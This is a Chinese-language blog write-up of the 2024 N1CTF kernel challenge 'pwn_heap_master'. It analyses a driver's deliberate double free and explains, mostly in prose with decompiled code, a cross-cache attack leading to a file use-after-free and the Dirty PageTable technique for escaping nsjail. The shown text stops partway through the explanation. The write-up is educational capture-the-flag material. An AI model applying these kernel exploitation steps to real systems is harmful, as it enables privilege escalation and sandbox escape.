<!DOCTYPE html><html lang="en" theme-mode="dark"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>Dirty PageTable-2024 N1CTF pwn_heap_master | XDLiu's Blog</title><link rel="icon" type="image/x-icon" href="/favicon.ico"><link rel="preload" as="font" crossorigin="anonymous" href="/font/Bender.ttf"><link rel="preload" as="font" crossorigin="anonymous" href="/font/BenderLight.ttf"><link rel="preload" as="font" crossorigin="anonymous" href="/font/JetBrainsMono-Regular.woff2"><link rel="stylesheet" href="/css/arknights.css"><style>@font-face {
  font-family: Bender;
  src: local('Bender'), url("/font/Bender.ttf"), url("/font/Bender.otf");
}
@font-face {
  font-family: BenderLight;
  src: local('BenderLight'), url("/font/BenderLight.ttf");
}
@font-face {
  font-family: 'JetBrains Mono';
  src: local('JetBrains Mono'), url('/font/JetBrainsMono-Regular.woff2') format('woff2');
}
</style><script>var config = {"root":"/","search":{"preload":false,"activeHolder":"Enter here","blurHolder":"Search","noResult":"Data \"$0\" not found"},"code":{"codeInfo":"$0 - $1 lines","copy":"copy"}}</script><link type="text/css" rel="stylesheet" href="/lib/encrypt/hbe.style.css"><script src="//unpkg.com/mermaid@10.5.0/dist/mermaid.min.js"></script><link type="text/css" rel="stylesheet" href="//unpkg.com/lightgallery@2.7.1/css/lightgallery.css"><link type="text/css" rel="stylesheet" href="//unpkg.com/lightgallery@2.7.1/css/lg-zoom.css"><link type="text/css" rel="stylesheet" href="//unpkg.com/lightgallery@2.7.1/css/lg-thumbnail.css"><link type="text/css" rel="stylesheet" href="/lib/fontawesome/css/all.min.css"><script>if (window.localStorage.getItem('theme-mode') === 'light')
 document.documentElement.setAttribute('theme-mode', 'light')
if (window.localStorage.getItem('theme-mode') === 'dark')
 document.documentElement.setAttribute('theme-mode', 'dark')</script><style>@font-face {
 font-family: BenderLight;
 src: local('Bender'), url("/font/BenderLight.woff2") format('woff2');
}
@font-face {
 font-family: 'JetBrains Mono';
 src: local('JetBrains Mono'), url('/font/JetBrainsMono-Regular.woff2') format('woff2');
}</style><style>:root {
 --dark-background: url('/img/bg1.jpg');
 --light-background: url('/img/bg1.jpg');
 --theme-encrypt-confirm: 'confirm'
}</style><script defer src="/js/arknights.js"></script><script defer src="/js/search.js"></script><script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><script async src="//unpkg.com/valine/dist/Valine.min.js"></script><script defer type="module">import mermaid from '//unpkg.com/mermaid@10.5.0/dist/mermaid.esm.mjs';
window.mermaid = mermaid;
code.paintMermaid();
</script><script async src="//unpkg.com/lightgallery@2.7.1/lightgallery.min.js"></script><script async src="//unpkg.com/lightgallery@2.7.1/plugins/zoom/lg-zoom.min.js"></script><script async src="//unpkg.com/lightgallery@2.7.1/plugins/thumbnail/lg-thumbnail.min.js"></script><script async src="/lib/encrypt/hbe.js"></script><script async src="/js/pjax.js"></script><script class="pjax-js">reset= () => {new Valine({
 el: '#valine'
 , appId: 'LBu2DnhuauLyX07fYwU7uiQt-gzGzoHsz'
 , appKey: 'WILjrWg7NsLKrjRrsBineLLo' , placeholder: 'This comment is sent by Penguin Logistics.'
 , path: window.location.pathname
});document.querySelector('.lg-container')?.remove()
lightGallery(document.getElementById('post-bg'), {
  plugins: [lgZoom,lgThumbnail],
  selector: '.item-img'})}</script><script>window.addEventListener("load",() => {pjax = new Pjax({
 cacheBust: false,
 selectors: ['title','article','#aside-block','.pjax-js','data-pjax','.busuanzi'],
 switches: {'article': Pjax.switches.sideBySide},
 switchesOptions: {
   'article': {
     classNames: {
       remove: "pjax-out",
       add: "pjax-in"
     }
   }
 }
});
document.addEventListener("pjax:complete", reset);document.addEventListener('pjax:success', _ => bszCaller.fetch(
 "//busuanzi.ibruce.info/busuanzi?jsonpCallback=BusuanziCallback", a => {
  bszTag.texts(a),
  bszTag.shows()
}));reset()})</script><script class="pjax-js">reset= () => {new Valine({
 el: '#valine'
 , appId: 'LBu2DnhuauLyX07fYwU7uiQt-gzGzoHsz'
 , appKey: 'WILjrWg7NsLKrjRrsBineLLo' , placeholder: 'This comment is sent by Penguin Logistics.'
 , path: window.location.pathname
});document.querySelector('.lg-container')?.remove()
lightGallery(document.getElementById('post-bg'), {
  plugins: [lgZoom,lgThumbnail],
  selector: '.item-img'})}</script><script>window.addEventListener("load",() => {pjax = new Pjax({
 cacheBust: false,
 selectors: ['title','article','#aside-block','.pjax-js'],
 switches: {'article': Pjax.switches.sideBySide},
 switchesOptions: {
   'article': {
     classNames: {
       remove: "pjax-out",
       add: "pjax-in"
     }
   }
 }
});
document.addEventListener("pjax:complete", reset);reset()})</script><meta name="generator" content="Hexo 7.3.0"></head><body><div class="loading" style="opacity: 0;"><div class="loadingBar left"></div><div class="loadingBar right"></div></div><main><header class="closed"><div class="navBtn"><i class="navBtnIcon"><span class="navBtnIconBar"></span><span class="navBtnIconBar"></span><span class="navBtnIconBar"></span></i></div><nav><div class="navItem" id="search-header"><span class="navItemTitle"><input autocomplete="off" autocorrect="off" autocapitalize="none" placeholder="Search" spellcheck="false" maxlength="50" type="text" id="search-input"></span></div><div class="navItem" id="search-holder"></div><div class="search-popup" tabindex="0"><div id="search-result"></div></div><ol class="navContent"><li class="navItem"><a class="navBlock" href="/"><span class="navItemTitle">Home</span></a></li><li class="navItem" matchdata="categories,tags"><a class="navBlock" href="/archives/"><span class="navItemTitle">Archives</span></a></li></ol></nav></header><article><div id="post-bg"><div id="post-title"><h1>Dirty PageTable-2024 N1CTF pwn_heap_master</h1><div id="post-info"><span>First Post: <div class="control"><time datetime="2024-11-17T13:58:53.000Z" id="date"> 2024-11-17</time></div></span><br><span>Last Update: <div class="control"><time datetime="2024-11-17T15:27:16.560Z" id="updated"> 2024-11-17</time></div></span><br><span id="busuanzi_container_page_pv">Page View: <span class="control" id="busuanzi_value_page_pv">loading...</span></span></div></div><hr><div id="post-content"><h3 id="2024-N1CTF-pwn-heap-master"><a href="#2024-N1CTF-pwn-heap-master" class="headerlink" title="2024 N1CTF pwn_heap_master"></a>2024 N1CTF pwn_heap_master</h3><h4 id="前置"><a href="#前置" class="headerlink" title="前置"></a>前置</h4><blockquote>
<p>对cross-cache attack有基本了解</p>
<p>本文很多是参考这两位师傅的文章(<a target="_blank" rel="noopener" href="https://bsauce.github.io/2024/04/25/Dirty-Pagetable/#1-%E8%84%8F%E9%A1%B5%E8%A1%A8%E5%8E%9F%E7%90%86">bsauce</a>&amp;<a target="_blank" rel="noopener" href="https://henrymartin262.github.io/2024/04/10/Dirty-pagetable-study/#4-%E4%BE%8B%E9%A2%98-m0leCon-Finals-2023-keasy">henry</a>)，但有些地方会做更详细的介绍</p>
<p>同时本文直接将dirtypagetable具体手法细节与题目结合起来讲</p>
<p>本人是赛棍，正式学习内核没多久，有错误的地方希望师傅提出建议</p>
</blockquote>
<h4 id="关于Dirty-PageTable"><a href="#关于Dirty-PageTable" class="headerlink" title="关于Dirty PageTable"></a>关于Dirty PageTable</h4><p>通过目标存在的double-free&#x2F;OOB&#x2F;uaf漏洞转化为对用户页表pte的控制，结合用户态程序可以实现任意物理地址写和读，由于是data-only的手法，可以绕过现有的基本保护和实现逃逸，且正常情况下成功率极高。</p>
<h4 id="分析题目"><a href="#分析题目" class="headerlink" title="分析题目"></a>分析题目</h4><h5 id="题目配置"><a href="#题目配置" class="headerlink" title="题目配置"></a>题目配置</h5><blockquote>
<p>题目链接<a href="../file/pwn_heap_master.zip">pwn_heap_master</a></p>
</blockquote>
<p>题目的内核版本是6.1.110，算是较高的版本了</p>
<p class='item-img' data-src='/../picture/dpt1.png'><img src="/../picture/dpt1.png" alt="image-20241117163555128"></p>
<p>同时该题目在启动内核后，运行根目录<code>startjail</code>，进入nsjail，因此该题目的目标是实现nsjail逃逸，而且会加载在<code>/etc/nsjail/nsjail.conf</code>的配置文件</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">#</span><span class="language-bash">!/bin/sh</span><br>ulimit -Hn 33000<br><br>/bin/nsjail --config /etc/nsjail/nsjail.conf<br>echo &quot;Bye&quot;<br></code></pre></td></tr></table></figure>

<p>对于配置文件重点关注挂载了什么，以及禁用了哪些系统调用</p>
<p>可以明显看见挂载了<code>/dev/safenote</code>以及<code>/dev/dma_heap</code>，通过挂载了&#x2F;dev&#x2F;dma_heap已经明显告诉你本题可以用dirty pagetable的手法，而且拿着dma_heap这个显眼的东西去bing查找大概率会查到dirty pagetable相关的文章</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><code class="hljs c">mount: [<br>  &#123;<br>    src: <span class="hljs-string">&quot;/bin&quot;</span><br>    dst: <span class="hljs-string">&quot;/bin&quot;</span><br>    is_bind: <span class="hljs-literal">true</span><br>    nosuid: <span class="hljs-literal">true</span><br>    rw: <span class="hljs-literal">false</span><br>  &#125;,<br>  &#123;<br>    src: <span class="hljs-string">&quot;/dev/dma_heap&quot;</span><br>    dst: <span class="hljs-string">&quot;/dev/dma_heap&quot;</span><br>    is_bind: <span class="hljs-literal">true</span><br>    nosuid: <span class="hljs-literal">true</span><br>    rw: <span class="hljs-literal">true</span><br>  &#125;,<br>  &#123;<br>    src: <span class="hljs-string">&quot;/dev/safenote&quot;</span><br>    dst: <span class="hljs-string">&quot;/dev/safenote&quot;</span><br>    is_bind: <span class="hljs-literal">true</span><br>    nosuid: <span class="hljs-literal">true</span><br>    rw: <span class="hljs-literal">true</span><br>  &#125;,<br>  &#123;<br>    src: <span class="hljs-string">&quot;/dev/null&quot;</span><br>    dst: <span class="hljs-string">&quot;/dev/null&quot;</span><br>    is_bind: <span class="hljs-literal">true</span><br>    nosuid: <span class="hljs-literal">true</span><br>    rw: <span class="hljs-literal">true</span><br>  &#125;,<br>  &#123;<br>    src: <span class="hljs-string">&quot;/dev/zero&quot;</span><br>    dst: <span class="hljs-string">&quot;/dev/zero&quot;</span><br>    is_bind: <span class="hljs-literal">true</span><br>    nosuid: <span class="hljs-literal">true</span><br>    rw: <span class="hljs-literal">true</span><br>  &#125;,<br>  &#123;<br>    src: <span class="hljs-string">&quot;/dev/random&quot;</span><br>    dst: <span class="hljs-string">&quot;/dev/random&quot;</span><br>    is_bind: <span class="hljs-literal">true</span><br>    nosuid: <span class="hljs-literal">true</span><br>    rw: <span class="hljs-literal">true</span><br>  &#125;,<br>  &#123;<br>    src: <span class="hljs-string">&quot;/dev/urandom&quot;</span><br>    dst: <span class="hljs-string">&quot;/dev/urandom&quot;</span><br>    is_bind: <span class="hljs-literal">true</span><br>    nosuid: <span class="hljs-literal">true</span><br>    rw: <span class="hljs-literal">true</span><br>  &#125;,<br>  &#123;<br>    dst: <span class="hljs-string">&quot;tmp&quot;</span><br>    fstype: <span class="hljs-string">&quot;tmpfs&quot;</span><br>    rw: <span class="hljs-literal">true</span><br>  &#125;,<br>  &#123;<br>    dst: <span class="hljs-string">&quot;/proc&quot;</span><br>    fstype: <span class="hljs-string">&quot;proc&quot;</span><br>    rw: <span class="hljs-literal">true</span><br>  &#125;,<br>]<br></code></pre></td></tr></table></figure>

<p>对于禁用的了系统调用，平时内核题所用的系统调用基本被禁用了，什么msg_msg，keyctl，等等都不能用了，pipe倒是还能用。</p>
<blockquote>
<p>由于启用了nsjail，可以在nsjail.conf文件的mount部分添加一条这个方便把exp导入nsjail中</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c">&#123;<br> src: <span class="hljs-string">&quot;/exp&quot;</span><br> dst: <span class="hljs-string">&quot;/exp&quot;</span><br> is_bind: <span class="hljs-literal">true</span><br> nosuid: <span class="hljs-literal">true</span><br> rw: <span class="hljs-literal">true</span><br>&#125;<br></code></pre></td></tr></table></figure>


</blockquote>
<h5 id="目标驱动"><a href="#目标驱动" class="headerlink" title="目标驱动"></a>目标驱动</h5><p>在初始化驱动时，会创建一个名为safenote大小为192独立kmem_cache,且<code>flags: 0x4052000 (SLAB_ACCOUNT | SLAB_PANIC | SLAB_STORE_USER | SLAB_HWCACHE_ALIGN)</code>存在<code>SLAB_ACCOUNT</code>因此不会和原有的kmem_cache合并。</p>
<p>在创建成功后还进行了一波神秘的操作，其具体功能后面再说。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> __cdecl <span class="hljs-title function_">safenote_init</span><span class="hljs-params">()</span><br>&#123;<br>  <span class="hljs-type">int</span> v0; <span class="hljs-comment">// r12d</span><br>  __int64 v1; <span class="hljs-comment">// rax</span><br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> v2; <span class="hljs-comment">// esi</span><br><br>  _fentry__();<br>  v0 = misc_register(&amp;safenote_device);<br>  <span class="hljs-keyword">if</span> ( v0 )<br>  &#123;<br>    printk(&amp;unk_2B1);<br>  &#125;<br>  <span class="hljs-keyword">else</span><br>  &#123;<br>    v1 = kmem_cache_create(<span class="hljs-string">&quot;safenote&quot;</span>, <span class="hljs-number">192LL</span>, <span class="hljs-number">0LL</span>, <span class="hljs-number">0x4052000</span>LL, <span class="hljs-number">0LL</span>);<br>    note_kcache = (kmem_cache *)v1;<br>    <span class="hljs-keyword">if</span> ( v1 )<br>    &#123;<br>      v2 = *(<span class="hljs-type">unsigned</span> __int16 *)(v1 + <span class="hljs-number">52</span>);<br>      *(_DWORD *)(v1 + <span class="hljs-number">44</span>) = <span class="hljs-number">52</span>;<br>      *(_DWORD *)(v1 + <span class="hljs-number">48</span>) = (v2 + <span class="hljs-number">103</span>) / v2;<br>    &#125;<br>    <span class="hljs-keyword">else</span><br>    &#123;<br>      v0 = <span class="hljs-number">-12</span>;<br>      printk(&amp;unk_308);<br>    &#125;<br>  &#125;<br>  <span class="hljs-keyword">return</span> v0;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>然后是分析基本操作，本题只有ioctl有可用的操作</p>
<p>ioctl维护着一个堆指针的表</p>
<p>功能一：能够从safenote上面申请一个chunk，且保存在用户指定idx对应表里，最多可以同时申请0x100个</p>
<p>功能二：能够释放用户指定idx对应表里的地址，且清空地址</p>
<p>功能三：能够有一次机会释放用户指定idx对应表里的地址，但不清空地址</p>
<p>很明显的<code>double free</code>+<code>cross-cache attack</code></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><code class="hljs c">__int64 __fastcall <span class="hljs-title function_">safenote_ioctl</span><span class="hljs-params">(file *f, <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> cmd, <span class="hljs-type">unsigned</span> __int64 arg)</span><br>&#123;<br>  __int64 v3; <span class="hljs-comment">// rdx</span><br>  __int64 result; <span class="hljs-comment">// rax</span><br>  <span class="hljs-type">u_int32_t</span> heap_idx; <span class="hljs-comment">// edx</span><br><br>  _fentry__();<br>  <span class="hljs-keyword">if</span> ( copy_from_user(&amp;ioc_arg, v3, <span class="hljs-number">4LL</span>) )<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">-14LL</span>;<br>  <span class="hljs-keyword">if</span> ( cmd == <span class="hljs-number">4920</span> )<br>  &#123;<br>    <span class="hljs-keyword">if</span> ( ioc_arg.heap_idx &lt;= <span class="hljs-number">0xFF</span> )<br>    &#123;<br>      <span class="hljs-keyword">if</span> ( !note[ioc_arg.heap_idx] )<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">0LL</span>;<br>      kfree();<br>      note[ioc_arg.heap_idx] = <span class="hljs-number">0LL</span>;<br>      <span class="hljs-keyword">return</span> <span class="hljs-number">0LL</span>;<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">-22LL</span>;<br>  &#125;<br>  <span class="hljs-keyword">if</span> ( cmd == <span class="hljs-number">4921</span> )<br>  &#123;<br>    <span class="hljs-keyword">if</span> ( !backdoor_used &amp;&amp; ioc_arg.heap_idx &lt;= <span class="hljs-number">0xFF</span> )<br>    &#123;<br>      <span class="hljs-keyword">if</span> ( !note[ioc_arg.heap_idx] )<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">0LL</span>;<br>      kfree();<br>      result = <span class="hljs-number">0LL</span>;<br>      backdoor_used = <span class="hljs-number">1</span>;<br>      <span class="hljs-keyword">return</span> result;<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">-22LL</span>;<br>  &#125;<br>  result = <span class="hljs-number">-22LL</span>;<br>  <span class="hljs-keyword">if</span> ( cmd == <span class="hljs-number">4919</span> )<br>  &#123;<br>    heap_idx = ioc_arg.heap_idx;<br>    <span class="hljs-keyword">if</span> ( ioc_arg.heap_idx &lt;= <span class="hljs-number">0xFF</span> &amp;&amp; !note[ioc_arg.heap_idx] )<br>    &#123;<br>      note[heap_idx] = (<span class="hljs-type">char</span> *)kmem_cache_alloc(note_kcache, <span class="hljs-number">0x400CC0</span>LL);<br>      <span class="hljs-keyword">if</span> ( note[ioc_arg.heap_idx] )<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">0LL</span>;<br>      <span class="hljs-keyword">return</span> <span class="hljs-number">-12LL</span>;<br>    &#125;<br>  &#125;<br>  <span class="hljs-keyword">return</span> result;<br>&#125;<br></code></pre></td></tr></table></figure>

<h5 id="神秘操作"><a href="#神秘操作" class="headerlink" title="神秘操作"></a>神秘操作</h5><p>可以从代码很明显的看出是对kmem_cache对应结构体作出了一些修改，我们可以直接利用<code>cat /proc/slabinfo</code>查看safenote和正常的kmalloc-192有什么区别</p>
<blockquote>
<p>或者用<a target="_blank" rel="noopener" href="https://github.com/destr4ct/gef-kernel">gef-kernel</a>里面所带的指令slub-dump来查看</p>
<p>gef-kernel非常建议使用，不像pwndbg的slab指令没有完整的symbols就不能使用，gef-kernel应该是使用了搜索内存的方式直接dump出来，非常方便，除此之外还有很多好用的指令，比如p2v，v2p实现虚拟地址和物理地址的转化，在这题就非常好用</p>
</blockquote>
<p>可以从图中看出<code>safenote</code>chunk大小是0x100，而正常<code>kmalloc-192</code>chunk大小是0xc0，所以可以确定神秘操作在干啥了</p>
<p class='item-img' data-src='/../picture/dpt2.png'><img src="/../picture/dpt2.png" alt="image-20241117173322160"></p>
<p>而将0xc0改成0x100有什么用呢，这里就是进一步告诉你使用file UAF，因为对于file结构体大小，申请的chunk大小也是0x100，利用上面的double-free可以很容易的实现file UAF</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">file</span> &#123;</span><br>	<span class="hljs-class"><span class="hljs-keyword">union</span> &#123;</span><br>		<span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">llist_node</span>  <span class="hljs-title">f_llist</span>;</span>              <span class="hljs-comment">/*     0     8 */</span><br>		<span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">callback_head</span> <span class="hljs-title">f_rcuhead</span>;</span>          <span class="hljs-comment">/*     0    16 */</span><br>		<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>       f_iocb_flags;         <span class="hljs-comment">/*     0     4 */</span><br>	&#125;;                                               <span class="hljs-comment">/*     0    16 */</span><br>	<span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">path</span>                <span class="hljs-title">f_path</span>;</span>               <span class="hljs-comment">/*    16    16 */</span><br>	<span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">inode</span> *             <span class="hljs-title">f_inode</span>;</span>              <span class="hljs-comment">/*    32     8 */</span><br>	<span class="hljs-type">const</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">file_operations</span>  * <span class="hljs-title">f_op</span>;</span>            <span class="hljs-comment">/*    40     8 */</span><br>	<span class="hljs-type">spinlock_t</span>                 f_lock;               <span class="hljs-comment">/*    48     4 */</span><br><br>	<span class="hljs-comment">/* XXX 4 bytes hole, try to pack */</span><br><br>	<span class="hljs-type">atomic_long_t</span>              f_count;              <span class="hljs-comment">/*    56     8 */</span><br>	<span class="hljs-comment">/* --- cacheline 1 boundary (64 bytes) --- */</span><br>	<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>               f_flags;              <span class="hljs-comment">/*    64     4 */</span><br>	<span class="hljs-type">fmode_t</span>                    f_mode;               <span class="hljs-comment">/*    68     4 */</span><br>	<span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">mutex</span>               <span class="hljs-title">f_pos_lock</span>;</span>           <span class="hljs-comment">/*    72    32 */</span><br>	<span class="hljs-type">loff_t</span>                     f_pos;                <span class="hljs-comment">/*   104     8 */</span><br>	<span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">fown_struct</span>         <span class="hljs-title">f_owner</span>;</span>              <span class="hljs-comment">/*   112    32 */</span><br>	<span class="hljs-comment">/* --- cacheline 2 boundary (128 bytes) was 16 bytes ago --- */</span><br>	<span class="hljs-type">const</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">cred</span>  *       <span class="hljs-title">f_cred</span>;</span>               <span class="hljs-comment">/*   144     8 */</span><br>	<span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">file_ra_state</span>       <span class="hljs-title">f_ra</span>;</span>                 <span class="hljs-comment">/*   152    32 */</span><br>	u64                        f_version;            <span class="hljs-comment">/*   184     8 */</span><br>	<span class="hljs-comment">/* --- cacheline 3 boundary (192 bytes) --- */</span><br>	<span class="hljs-type">void</span> *                     f_security;           <span class="hljs-comment">/*   192     8 */</span><br>	<span class="hljs-type">void</span> *                     private_data;         <span class="hljs-comment">/*   200     8 */</span><br>	<span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">hlist_head</span> *        <span class="hljs-title">f_ep</span>;</span>                 <span class="hljs-comment">/*   208     8 */</span><br>	<span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">address_space</span> *     <span class="hljs-title">f_mapping</span>;</span>            <span class="hljs-comment">/*   216     8 */</span><br>	<span class="hljs-type">errseq_t</span>                   f_wb_err;             <span class="hljs-comment">/*   224     4 */</span><br>	<span class="hljs-type">errseq_t</span>                   f_sb_err;             <span class="hljs-comment">/*   228     4 */</span><br><br>	<span class="hljs-comment">/* size: 232, cachelines: 4, members: 20 */</span><br>	<span class="hljs-comment">/* sum members: 228, holes: 1, sum holes: 4 */</span><br>	<span class="hljs-comment">/* last cacheline: 40 bytes */</span><br>&#125;;<br></code></pre></td></tr></table></figure>

<h4 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h4><p>对于file UAF，很容易就能想到dirty cred来实现仅可读文件覆写，但是一方面对于该题的linux版本dirty cred能否还可以使用存在疑问，另一方面要实现逃逸只能去修改主机挂载过来的&#x2F;bin文件夹(可能&#x2F;proc下也有能用的)，然后修改退出时执行的echo，可问题在于退出nsjail时，需要先退出exp，如果使用file UAF后退出时资源释放很大概率是会导致崩溃的</p>
<p>所以使用<code>cross-cache attack</code>+<code>dirty pagetable</code>来实现漏洞利用</p>
<h5 id="第一步"><a href="#第一步" class="headerlink" title="第一步"></a>第一步</h5><p>实现file UAF</p>
<p>如果明白<code>cross-cache attack</code>这一步较为简单，首先是使用safenote直接kmalloc满0x100个chunk，然后全部free，留下一个用于double-free，根据chunk大小为0x100，一个page可以有16个chunk，safenote每次是申请一个slab都是一个page，0x100个chunk就是16个slab，同时该题最大留存的slab数量是4(神秘操作里有个除2操作，应该就是用于减小最大留存的slab数量，提高利用成功率)，如果0x100个chunk全部释放则有12个slab会被释放，即有12个page被释放回buddy system</p>
<p>然后就是一次性打开大量的同一个任意文件，喷射file结构体，使得之前释放的page立马被再次拿来使用，而且buddy system也是遵循FILO，所以极高概率是申请回之前释放的page。</p>
<p>喷射完毕后我们使用safenote的free函数，free掉刚才保留的指针，此时有一个file struct被释放了。</p>
<p>接下来就是确定哪一个fd对应的file结构体被释放了，可以再次喷射大量的另一个文件的file struct，使得之前被释放的file struct被占用，现在循环read之前喷射的fd，如果有不一样的，则是victim fd。</p>
<h5 id="第二步"><a href="#第二步" class="headerlink" title="第二步"></a>第二步</h5><p>现在将除了victim fd以外的fd全部close，由于有两个fd指向了同一个file struct，则不需要close victim fd，刚才kmalloc大量的file struct，全部file stuct释放后，大部分的slab对应的page又会回到buddy system中</p>
<p>接下来就要讲关于dirty pagetable的东西了</p>
<p>众所周知，每一个用户态进程都有一个对应的页表，通常64位的linux使用的是4级页表</p>
<p>对应下图从PGD到PUD到PMD再到PTE，PTE就是指向具体物理地址的信息了</p>
<p>对于每一个页表或者页表目录都是1page大小，即4096byte，每个页表项都是占8字节，则每个page有512个页表项</p>
<p class='item-img' data-src='/../picture/dpt3.png'><img src="/../picture/dpt3.png"></p>
<p>而对于一个用户态程序，可以看见有许多没有对应的物理地址的虚拟地址，这些虚拟地址我们可以使用mmap函数来映射对应的物理地址，在这些虚拟地址没被映射之前，其对应的页表目录是没有被创建的，显然不可能都创建的如果每个程序都将其的页表目录全部创建，那得占用很大一部分空间。</p>
<p>如果我们主动去mmap大量的地址则会有大量的1page从buddysystem中被申请出来，用于创建页表</p>
<blockquote>
<p>需要注意mmap可以放在exp开始时直接执行，因为只有第一次读写对应mmap地址时，才会触发缺页然后映射对应的物理地址以及可能创建对应的页表项</p>
</blockquote>
<p>我们回到上面free掉所有的file struct，则会有大量的1page回到buddysystem中，然后去mmap大量的地址，这些1page又被拉回来使用，而其中有一部分地方是我们的uaf的file struct对应的地方。</p>
<p class='item-img' data-src='/../picture/dpt4.png'><img src="/../picture/dpt4.png"></p>
<p>在内存中你会发现victim fd对应file struct的内容都是pte</p>
